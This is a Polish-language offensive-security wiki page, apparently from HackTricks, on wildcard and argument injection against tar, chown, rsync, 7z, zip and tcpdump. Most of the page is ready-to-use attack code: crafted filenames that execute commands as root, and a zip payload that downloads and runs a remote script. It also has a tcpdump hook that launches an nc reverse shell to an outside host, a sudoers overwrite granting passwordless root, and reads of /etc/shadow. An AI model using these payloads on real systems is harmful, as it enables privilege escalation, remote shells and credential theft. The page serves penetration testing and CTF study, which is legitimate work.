# Sztuczki z Wildcards

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** występuje, gdy uprzywilejowany skrypt uruchamia Unix binary, takie jak `tar`, `chown`, `rsync`, `zip`, `7z`, … z nieujętym w cudzysłów wildcardem, takim jak `*`.
> Ponieważ shell rozwija wildcard **przed** wykonaniem binary, atakujący, który może tworzyć pliki w katalogu roboczym, może przygotować nazwy plików zaczynające się od `-`, dzięki czemu zostaną zinterpretowane jako **opcje zamiast danych**, skutecznie przemycając dowolne flagi, a nawet commands.
> Ta strona zawiera najprzydatniejsze primitives, najnowsze badania oraz współczesne mechanizmy wykrywania na lata 2023-2025.

## chown / chmod

Możesz **skopiować właściciela/grupę lub bity uprawnień dowolnego pliku**, wykorzystując flagę `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Gdy root później wykona coś takiego:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Zobacz także klasyczny artykuł DefenseCode, aby uzyskać szczegółowe informacje.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Execute arbitrary commands by abusing the **checkpoint** feature:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Gdy root uruchomi na przykład `tar -czf /root/backup.tgz *`, `shell.sh` zostanie wykonany z uprawnieniami root.

### bsdtar / macOS 14+

Domyślny `tar` w nowszych wersjach macOS (oparty na `libarchive`) nie implementuje `--checkpoint`, ale nadal można uzyskać code-execution za pomocą flagi **--use-compress-program**, która pozwala określić zewnętrzny kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Gdy uprzywilejowany skrypt uruchamia `tar -cf backup.tar *`, zostanie uruchomiony `/bin/sh`.

---

## rsync

`rsync` pozwala nadpisać zdalną powłokę lub nawet zdalny plik binarny za pomocą flag wiersza poleceń rozpoczynających się od `-e` lub `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Jeśli root później zarchiwizuje katalog za pomocą `rsync -az * backup:/srv/`, wstrzyknięta flaga uruchomi twoją powłokę po stronie zdalnej.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (tryb `rsync`).

---

## 7-Zip / 7z / 7za

Nawet gdy uprzywilejowany skrypt *defensywnie* poprzedza wildcard ciągiem `--` (aby zatrzymać parsowanie opcji), format 7-Zip obsługuje **pliki z listą plików** poprzez poprzedzenie nazwy pliku znakiem `@`. Połączenie tego z symlinkiem pozwala *wyeksfiltrujować dowolne pliki*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Jeśli root wykona coś takiego:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip spróbuje odczytać `root.txt` (→ `/etc/shadow`) jako listę plików i zakończy działanie, **wypisując zawartość do stderr**.

Działa to również z `-- *`, ponieważ CLI 7-Zip jawnie akceptuje zarówno zwykłe nazwy plików, jak i `@listfiles` jako argumenty pozycyjne, więc literalna nazwa pliku, taka jak `@root.txt`, nadal jest traktowana specjalnie.

---

## zip

Istnieją dwa bardzo praktyczne primitives, gdy aplikacja przekazuje kontrolowane przez użytkownika nazwy plików do `zip` (przez wildcard albo przez wyliczanie nazw bez `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` włącza „test archive”, a `-TT <cmd>` zastępuje tester dowolnym programem (długa forma: `--unzip-command <cmd>`). Jeśli możesz wstrzyknąć nazwy plików zaczynające się od `-`, rozdziel flagi na osobne nazwy plików, aby parsing short options działał:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Uwagi
- NIE próbuj używać pojedynczej nazwy pliku, takiej jak `'-T -TT <cmd>'` — krótkie opcje są analizowane znak po znaku i to zakończy się niepowodzeniem. Użyj osobnych tokenów, jak pokazano.
- Jeśli aplikacja usuwa ukośniki z nazw plików, pobierz plik z podstawowego hosta/adresu IP (domyślna ścieżka `/index.html`) i zapisz go lokalnie za pomocą `-O`, a następnie wykonaj.
- Możesz debugować analizowanie za pomocą `-sc` (pokazuje przetworzone argv) lub `-h2` (więcej pomocy), aby zrozumieć, jak przetwarzane są tokeny.

Przykład (lokalne działanie w zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: If the web layer echoes `zip` stdout/stderr (common with naive wrappers), injected flags like `--help` or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding payload tuning.

---

## Dodatkowe binary podatne na wildcard injection (krótka lista 2023-2025)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Odczyt zawartości pliku |
| `flock` | `-c <cmd>` | Wykonanie command |
| `git`   | `-c core.sshCommand=<cmd>` | Wykonanie command przez git over SSH |
| `scp`   | `-S <cmd>` | Uruchomienie dowolnego programu zamiast ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Wyszukiwanie podatnych wrapperów i jobs

Recent case studies have shown that wildcard/argv injection is no longer just a **cron + tar** problem.<sup>[[5]](#references)</sup> The same bug class keeps appearing in:

- funkcjach webowych, które "download everything as zip/tar" z kontrolowanych przez atakującego upload directories
- powłokach debugowania vendor/appliance, które udostępniają wrapper **tcpdump** z kontrolowanymi przez atakującego polami filename/filter
- jobs backupu lub rotacji, które wykonują `tar`, `rsync`, `7z`, `zip`, `chown` albo `chmod` na writable directories

Przydatne commands triage:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Szybkie wskazówki:

- `-- *` to dobre rozwiązanie dla wielu GNU tools, ale **nie** dla `7z`/`7za`, ponieważ `@listfiles` są analizowane osobno.
- W przypadku `zip` szukaj wrappers, które bezpośrednio wyliczają filenames kontrolowane przez użytkownika; short-option splitting (`-T` + `-TT <cmd>`) nadal działa nawet bez shell glob.
- W przypadku `tcpdump` zwróć szczególną uwagę na wrappers, które pozwalają kontrolować **nazwy plików wyjściowych**, **ustawienia rotacji** lub argumenty **replay plików przechwytywania**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Gdy restricted shell lub vendor wrapper buduje command line `tcpdump` przez konkatenację pól kontrolowanych przez użytkownika (np. parametru „file name”) bez ścisłego quoting/validation, można przemycić dodatkowe flagi `tcpdump`. Połączenie `-G` (rotacja oparta na czasie), `-W` (ograniczenie liczby plików) oraz `-z <cmd>` (post-rotate command) umożliwia arbitrary command execution jako użytkownik uruchamiający tcpdump (często root na appliances).<sup>[[1]](#references)[[4]](#references)</sup>

Wymagania wstępne:

- Możesz wpływać na `argv` przekazywane do `tcpdump` (np. przez wrapper taki jak `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper nie sanityzuje spacji ani tokens zaczynających się od `-` w polu file name.

Classic PoC (uruchamia reverse shell script ze ścieżki writable):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Szczegóły:

- `-G 1 -W 1` wymusza natychmiastową rotację po pierwszym pasującym pakiecie.
- `-z <cmd>` uruchamia post-rotate command raz na każdą rotację. Wiele buildów wykonuje `<cmd> <savefile>`. Jeśli `<cmd>` jest skryptem/interpreterem, upewnij się, że obsługa argumentów odpowiada Twojemu payloadowi.

Warianty bez removable media:

- Jeśli masz dowolny inny primitive do zapisywania plików (np. osobny command wrapper umożliwiający przekierowanie outputu), umieść skrypt w znanej ścieżce i wywołaj `-z /bin/sh /path/script.sh` lub `-z /path/script.sh`, zależnie od semantyki platformy.
- Niektóre vendor wrappers wykonują rotację do lokalizacji kontrolowanych przez attackera. Jeśli możesz wpłynąć na rotated path (symlink/directory traversal), możesz skierować `-z` do wykonania treści, nad którą masz pełną kontrolę, bez użycia zewnętrznych nośników.

---

## sudoers: tcpdump z wildcards/additional args → arbitrary write/read i root

Bardzo częsty anti-pattern w sudoers:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemy
- Glob `*` i permisywne wzorce ograniczają tylko pierwszy argument `-w`. `tcpdump` akceptuje wiele opcji `-w`; wygrywa ostatnia.
- Reguła nie przypina innych opcji, więc dozwolone są `-Z`, `-r`, `-V` itd.

Primitives
- Nadpisz ścieżkę docelową za pomocą drugiego `-w` (pierwszy spełnia wymagania sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal wewnątrz pierwszego `-w`, aby wydostać się z ograniczonego drzewa:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Wymuś własność plików przez `-Z root` (tworzy pliki należące do root w dowolnym miejscu):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Zapis dowolnej treści przez odtworzenie spreparowanego PCAP za pomocą `-r` (np. w celu dodania wpisu do sudoers):

<details>
<summary>Utwórz PCAP zawierający dokładny ładunek ASCII i zapisz go jako root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (interprets a list of savefiles). Diagnostyka błędów często wyświetla wiersze, powodując wyciek zawartości:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Referencje

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
